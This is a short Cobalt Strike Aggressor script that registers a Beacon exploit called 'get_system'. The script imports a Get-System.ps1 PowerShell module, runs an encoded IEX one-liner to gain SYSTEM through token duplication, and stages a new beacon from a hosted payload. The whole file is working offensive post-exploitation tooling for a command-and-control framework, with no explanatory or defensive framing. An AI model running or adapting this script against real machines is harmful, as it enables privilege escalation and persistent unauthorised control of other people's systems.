sub get_system {
	local('$script $oneliner');

	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via token dumplication", "T1068");

	$script = artifact($2, "powershell");

	$oneliner = beacon_host_script($1, $script);

	bpowershell_import!($1, getFileProper(script_resource("modules"), "Get-System.ps1"));
	bpowerpick!($1, "\$a=[System.Text.UnicodeEncoding]::Unicode.GetString([Convert]::FromBase64String(''));IEX \$a;\$ps.AddScript( {Get-System -Technique Token; $+ $oneliner $+ } ).Invoke(0);");

	bstage($1, $null, $2);
}

beacon_exploit_register("get_system", "Get system via token dumplication and Spawn a new beacon", &get_system); 

